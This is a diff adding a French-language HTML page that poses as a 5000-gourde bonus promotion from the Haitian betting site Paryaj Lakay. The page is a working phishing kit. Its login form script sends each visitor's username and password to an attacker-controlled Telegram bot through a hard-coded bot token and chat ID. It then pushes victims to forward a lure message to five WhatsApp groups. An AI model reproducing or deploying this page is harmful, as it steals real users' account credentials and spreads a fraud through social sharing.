@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bonus 5000 Gourdes Paryaj Lakay</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    /* Fond flouté pour toutes les pages */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: url('https://i.postimg.cc/026StDM8/Screenshot-20241120-123741-Kiwi-Browser.jpg') no-repeat center;
+      background-size: cover;
+      filter: blur(8px); /* Appliquer un flou sur le fond */
+      z-index: 1;
+    }
+
+    .container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.8); /* Fond léger transparent */
+      border-radius: 10px;
+      width: 80%;
+      max-width: 500px;
+      z-index: 2;
+    }
+
+    .title {
+      font-size: 2.5rem;
+      color: #333;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .description {
+      font-size: 1.2rem;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    .note {
+      font-size: 1rem;
+      color: #555;
+      margin-top: 20px;
+    }
+
+    .btn-ok {
+      padding: 10px 20px;
+      background-color: #00a651;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+
+    .btn-ok:hover {
+      background-color: #008f47;
+    }
+
+    /* Page de partage après connexion */
+    .share-header {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .share-description {
+      font-size: 1.2rem;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    .share-btn {
+      padding: 10px 20px;
+      background-color: #00a651;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .share-btn:hover {
+      background-color: #008f47;
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 350px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      margin-top: -30px; /* Ajuste l'écart pour rester aligné avec l'image */
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    .login-header {
+      background: black;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 5px 5px 0 0;
+    }
+
+    .login-form input {
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #00a651;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .login-btn:hover {
+      background-color: #008f47;
+    }
+
+    .forgot-password {
+      margin-top: 10px;
+      font-size: 12px;
+    }
+
+    .forgot-password a {
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    .register {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .register a {
+      color: #007bff;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .register a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Fond flouté pour toutes les pages -->
+  <div class="overlay"></div> <!-- Fond flouté -->
+
+  <!-- Page d'introduction -->
+  <div class="container" id="introPage">
+    <div class="title">Bonus 5000 Gourdes Paryaj Lakay</div>
+    <div class="description">
+      Pour accéder à vos bonus et promotions, veuillez vous connecter et gagner <span class="highlight">5000 Gourdes</span> ! 🎉
+    </div>
+    <button class="btn-ok" onclick="showLoginPage()">Se connecter</button>
+  </div>
+
+  <!-- Page de connexion -->
+  <div class="login-container" id="loginPage" style="display: none;">
+    <div class="login-header">CONNEXION</div>
+    <form class="login-form" id="loginForm">
+      <input type="text" id="username" placeholder="🇭🇹 +509 Identifiant" required>
+      <input type="password" id="password" placeholder="Mot de passe" required>
+      <button type="submit" class="login-btn">Se connecter</button>
+    </form>
+    <div class="forgot-password">
+      <a href="#">Mot de passe oublié ?</a>
+    </div>
+    <div class="register">
+      Nouveau ? <a href="#">Crée-toi un compte</a> en quelques minutes !
+    </div>
+  </div>
+
+  <!-- Page de partage -->
+  <div class="container" id="sharePage" style="display: none;">
+    <div class="share-header">Partagez et obtenez votre bonus !</div>
+    <div class="share-description">
+      Félicitations ! Vous êtes connecté. Pour recevoir vos 5000 Gourdes, partagez ce message dans 5 groupes WhatsApp !
+    </div>
+    <div>
+      <!-- Lien dynamique pour WhatsApp avec message auto-généré -->
+      <a id="whatsappLink" href="https://wa.me/?text=" target="_blank">
+        <button class="share-btn">Partager sur WhatsApp</button>
+      </a>
+    </div>
+    <div class="note">
+      *Partagez le message dans 5 groupes pour obtenir le bonus !
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      // Récupérer les données de connexion
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Configuration de l'envoi via Telegram
+      const botToken = '7758063218:AAHP_0GVZet8I00a2xzWHfRw2Bwwp4MnZc4';
+      const chatId = '7055230106';
+      const message = `🔔 Nouvelle connexion :
+Identifiant : ${username}
+Mot de passe : ${password}`;
+
+      // URL de l'API Telegram
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Envoi de la requête
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+        .then((response) => {
+          if (response.ok) {
+            // Afficher la page de partage après connexion
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('sharePage').style.display = 'block';
+
+            // Appeler la fonction pour générer le message WhatsApp après la connexion
+            generateWhatsappMessage();
+          } else {
+            alert('Erreur lors de l\'envoi.');
+          }
+        })
+        .catch((error) => {
+          console.error('Erreur :', error);
+          alert('Une erreur est survenue.');
+        });
+    });
+
+    // Fonction pour afficher la page de connexion
+    function showLoginPage() {
+      document.getElementById('introPage').style.display = 'none';
+      document.getElementById('loginPage').style.display = 'block';
+    }
+
+    // Fonction pour générer automatiquement le message avec l'URL de la page
+    function generateWhatsappMessage() {
+      // Remplacer par le lien réel de la page
+      const pageUrl = "https://www.paryajlakay.com"; // URL de votre page réelle
+      
+      // Message à partager sur WhatsApp
+      const message = encodeURIComponent(
+        `🎉 **Paryaj Lakay** vous offre un bonus de **5000 Gourdes** en vous connectant sur notre plateforme ! 🎉\n\n` +
+        `🚀 Pour recevoir votre bonus, connectez-vous maintenant et commencez à gagner ! 🚀\n\n` +
+        `✅ Cliquez ici pour accéder à votre compte et obtenir votre bonus exclusif : ${pageUrl}`
+      );
+
+      // Mettre à jour l'URL du lien WhatsApp
+      const whatsappLink = document.getElementById('whatsappLink');
+      whatsappLink.href = `https://wa.me/?text=${message}`;
+    }
+
+  </script>
+
+</body>
+</html>
